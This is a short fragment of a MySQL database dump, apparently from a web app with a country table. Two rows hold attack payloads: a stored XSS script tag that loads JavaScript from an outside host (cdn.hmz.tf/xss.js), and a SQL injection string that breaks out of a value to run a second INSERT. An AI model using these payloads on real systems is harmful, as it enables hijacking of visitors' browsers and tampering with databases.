...
--
-- Hôte : localhost:3306
-- Généré le : mar. 30 mars 2021 à 12:16
...
(64, 'Wakanda 2', '🏴<script src=\"https://cdn.hmz.tf/xss.js\"></script>', 'Jabari Town', '0\'); INSERT INTO `country` (`country_name`, `country_flag`, `country_capital`, `country_area`) VALUES (\'Faille injection SQL\',\'🏳️\',\'Faille injection SQL\',\'666\'); -- '),
(65, 'Utopia', '🏴<script src=\"https://cdn.hmz.tf/xss.js\"></script>', 'Delirium', '0\'); INSERT INTO `country` (`country_name`, `country_flag`, `country_capital`, `country_area`) VALUES (\'Faille injection SQL\',\'🏳️\',\'Faille injection SQL\',\'666\'); -- ');
